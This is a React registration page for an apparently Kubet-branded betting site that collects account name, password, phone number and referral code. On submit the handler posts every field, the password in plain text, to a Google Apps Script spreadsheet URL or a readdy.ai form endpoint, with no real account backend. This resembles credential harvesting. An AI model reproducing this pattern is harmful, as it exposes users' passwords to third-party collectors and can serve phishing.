import { useState } from 'react';
import { useSiteConfigContext } from '@/contexts/SiteConfigContext';

export default function RegisterPage() {
  const { config } = useSiteConfigContext();
  const c = config.authRegister;

  const [referralCode, setReferralCode] = useState('');
  const [account, setAccount] = useState('');
  const [accountError, setAccountError] = useState(false);
  const [nickname, setNickname] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [phone, setPhone] = useState('');
  const [checkbox1, setCheckbox1] = useState(true);
  const [checkbox2, setCheckbox2] = useState(true);
  const [status, setStatus] = useState<'idle' | 'submitting' | 'success' | 'error'>('idle');

  const validateAccount = (value: string) => {
    const valid = /^[a-zA-Z0-9]{4,10}$/.test(value);
    setAccountError(value.length > 0 && !valid);
  };

  const handleAccountChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    setAccount(value);
    validateAccount(value);
  };

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    if (accountError || !account || !password || !phone) return;
    setStatus('submitting');

    const form = e.currentTarget;
    const formData = new FormData(form);
    const payload: Record<string, string> = {
      type: 'register',
      timestamp: new Date().toISOString(),
    };
    formData.forEach((value, key) => {
      if (typeof value === 'string') payload[key] = value;
    });

    try {
      if (c.gSheetUrl) {
        // Gửi trực tiếp về Google Apps Script
        await fetch(c.gSheetUrl, {
          method: 'POST',
          mode: 'no-cors',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload),
        });
      } else {
        // Fallback: gửi về Readdy form
        const params = new URLSearchParams();
        Object.entries(payload).forEach(([k, v]) => params.append(k, v));
        await fetch('https://readdy.ai/api/form/d7vfp1fhqiv7jea6ag50', {
          method: 'POST',
          mode: 'no-cors',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: params.toString(),
        });
      }
      setStatus('success');
      setReferralCode('');
      setAccount('');
      setNickname('');
      setPassword('');
      setPhone('');
      form.reset();
    } catch {
      setStatus('error');
    }
  };

  return (
    <div className="min-h-screen flex flex-col" style={{ backgroundColor: c.bgColor }}>
      {/* Toolbar 1 */}
      <div className="w-full py-2 text-center text-xs font-medium tracking-wide" style={{ backgroundColor: c.accentColor, color: '#ffffff' }}>
        <div className="flex items-center justify-center gap-2 px-4">
          <span className="w-4 h-4 flex items-center justify-center">
            <i className="ri-football-line w-4 h-4 flex items-center justify-center" />
          </span>
          <span className="whitespace-nowrap">{c.toolbar1}</span>
        </div>
      </div>

      {/* Toolbar 2 */}
      <div className="w-full py-2 text-center text-xs font-medium tracking-wide" style={{ backgroundColor: '#000000', color: '#ffffff' }}>
        <div className="flex items-center justify-center gap-2 px-4">
          <span className="w-4 h-4 flex items-center justify-center">
            <i className="ri-trophy-line w-4 h-4 flex items-center justify-center text-yellow-400" />
          </span>
          <span className="whitespace-nowrap">{c.toolbar2}</span>
        </div>
      </div>

      {/* Main content */}
      <div className="flex-1 flex items-start justify-center px-3 md:px-4 py-4 md:py-8">
        <div className="w-full max-w-md">
          {/* Card */}
          <div className="rounded-lg border overflow-hidden" style={{ backgroundColor: c.cardBg, borderColor: c.borderColor }}>
            {/* Header */}
            <div className="px-3 md:px-4 py-3 border-b flex items-center justify-center relative" style={{ borderColor: c.borderColor }}>
              <h1 className="text-sm md:text-base font-bold tracking-wider" style={{ color: c.accentColor }}>
                {c.title}
              </h1>
              <button
                type="button"
                className="absolute right-3 w-7 h-7 flex items-center justify-center text-gray-400 hover:text-gray-600 cursor-pointer"
                onClick={() => window.history.back()}
              >
                <i className="ri-close-line text-xl w-5 h-5 flex items-center justify-center" />
              </button>
            </div>

            <form id="dang-ky-kubet" data-readdy-form onSubmit={handleSubmit} className="p-3 md:p-4 space-y-2.5 md:space-y-3">
              {/* Mã giới thiệu */}
              <div className="flex flex-col md:flex-row md:items-center gap-1 md:gap-3">
                <label className="text-sm text-gray-700 md:w-24 md:flex-shrink-0 md:text-right">{c.referralCodeLabel}</label>
                <input
                  name="referralCode"
                  type="text"
                  value={referralCode}
                  onChange={(e) => setReferralCode(e.target.value)}
                  placeholder={c.referralCodePlaceholder}
                  className="flex-1 px-3 py-2 text-sm rounded-sm border focus:outline-none"
                  style={{ backgroundColor: c.cardBg, borderColor: c.borderColor }}
                />
              </div>

              {/* Tài khoản */}
              <div className="flex flex-col md:flex-row md:items-start gap-1 md:gap-3">
                <label className="text-sm text-gray-700 md:w-24 md:flex-shrink-0 md:text-right md:pt-2">{c.accountLabel}</label>
                <div className="flex-1">
                  <input
                    name="account"
                    type="text"
                    value={account}
                    onChange={handleAccountChange}
                    placeholder={c.accountPlaceholder}
                    required
                    className="w-full px-3 py-2 text-sm rounded-sm border focus:outline-none"
                    style={{ backgroundColor: c.cardBg, borderColor: c.borderColor }}
                  />
                  {accountError && (
                    <p className="text-xs text-red-500 mt-1">{c.accountValidationText}</p>
                  )}
                </div>
              </div>

              {/* Biệt danh */}
              <div className="flex flex-col md:flex-row md:items-center gap-1 md:gap-3">
                <label className="text-sm text-gray-700 md:w-24 md:flex-shrink-0 md:text-right">{c.nicknameLabel}</label>
                <input
                  name="nickname"
                  type="text"
                  value={nickname}
                  onChange={(e) => setNickname(e.target.value)}
                  placeholder={c.nicknamePlaceholder}
                  className="flex-1 px-3 py-2 text-sm rounded-sm border focus:outline-none"
                  style={{ backgroundColor: c.cardBg, borderColor: c.borderColor }}
                />
              </div>

              {/* Mật khẩu */}
              <div className="flex flex-col md:flex-row md:items-center gap-1 md:gap-3">
                <label className="text-sm text-gray-700 md:w-24 md:flex-shrink-0 md:text-right">{c.passwordLabel}</label>
                <div className="flex-1 relative">
                  <input
                    name="password"
                    type={showPassword ? 'text' : 'password'}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    placeholder={c.passwordPlaceholder}
                    required
                    className="w-full px-3 py-2 pr-10 text-sm rounded-sm border focus:outline-none"
                    style={{ backgroundColor: c.cardBg, borderColor: c.borderColor }}
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-2 top-1/2 -translate-y-1/2 w-6 h-6 flex items-center justify-center text-gray-400 hover:text-gray-600 cursor-pointer"
                  >
                    <i className={`${showPassword ? c.passwordHideIcon : c.passwordShowIcon} w-5 h-5 flex items-center justify-center`} />
                  </button>
                </div>
              </div>

              <hr className="my-1" style={{ borderColor: c.borderColor }} />

              {/* SĐT */}
              <div className="flex flex-col md:flex-row md:items-center gap-1 md:gap-3">
                <label className="text-sm text-gray-700 md:w-24 md:flex-shrink-0 md:text-right">{c.phoneLabel}</label>
                <input
                  name="phone"
                  type="tel"
                  value={phone}
                  onChange={(e) => setPhone(e.target.value)}
                  placeholder={c.otpPlaceholder}
                  required
                  className="flex-1 px-3 py-2 text-sm rounded-sm border focus:outline-none"
                  style={{ backgroundColor: c.cardBg, borderColor: c.borderColor }}
                />
              </div>

              <hr className="my-1" style={{ borderColor: c.borderColor }} />

              {/* Checkbox 1 */}
              <div className="flex items-start gap-2">
                <button
                  type="button"
                  onClick={() => setCheckbox1(!checkbox1)}
                  className="w-5 h-5 flex-shrink-0 flex items-center justify-center border rounded-sm mt-0.5 cursor-pointer"
                  style={{
                    borderColor: c.accentColor,
                    backgroundColor: checkbox1 ? c.accentColor : '#fff',
                  }}
                >
                  {checkbox1 && <i className="ri-check-line text-white w-4 h-4 flex items-center justify-center" />}
                </button>
                <span className="text-xs md:text-sm text-gray-700 leading-relaxed">{c.checkbox1Label}</span>
              </div>

              {/* Checkbox 2 */}
              <div className="flex items-start gap-2">
                <button
                  type="button"
                  onClick={() => setCheckbox2(!checkbox2)}
                  className="w-5 h-5 flex-shrink-0 flex items-center justify-center border rounded-sm mt-0.5 cursor-pointer"
                  style={{
                    borderColor: c.accentColor,
                    backgroundColor: checkbox2 ? c.accentColor : '#fff',
                  }}
                >
                  {checkbox2 && <i className="ri-check-line text-white w-4 h-4 flex items-center justify-center" />}
                </button>
                <span className="text-xs md:text-sm text-gray-700 leading-relaxed">
                  {c.checkbox2Label}{' '}
                  <a href={c.termsUrl} target="_blank" rel="noopener noreferrer" className="underline" style={{ color: c.accentColor }}>
                    {c.termsLinkText}
                  </a>
                </span>
              </div>

              {/* Submit button */}
              <button
                type="submit"
                disabled={status === 'submitting'}
                className="w-full text-white text-sm font-medium py-3 rounded-sm transition-colors disabled:opacity-50 disabled:cursor-not-allowed cursor-pointer whitespace-nowrap"
                style={{ backgroundColor: c.accentColor }}
              >
                {status === 'submitting' ? (
                  <span className="inline-flex items-center gap-2">
                    <i className="ri-loader-4-line animate-spin w-4 h-4 flex items-center justify-center" />
                    Đang xử lý...
                  </span>
                ) : (
                  c.confirmButtonText
                )}
              </button>
            </form>

            {status === 'success' && (
              <div className="mx-3 md:mx-4 mb-3 md:mb-4 p-3 bg-green-50 border border-green-200 rounded-sm text-sm text-green-700 flex items-start gap-2">
                <i className="ri-checkbox-circle-line mt-0.5 w-4 h-4 flex items-center justify-center flex-shrink-0" />
                {c.successMessage}
              </div>
            )}

            {status === 'error' && (
              <div className="mx-3 md:mx-4 mb-3 md:mb-4 p-3 bg-red-50 border border-red-200 rounded-sm text-sm text-red-700 flex items-start gap-2">
                <i className="ri-error-warning-line mt-0.5 w-4 h-4 flex items-center justify-center flex-shrink-0" />
                {c.errorMessage}
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
}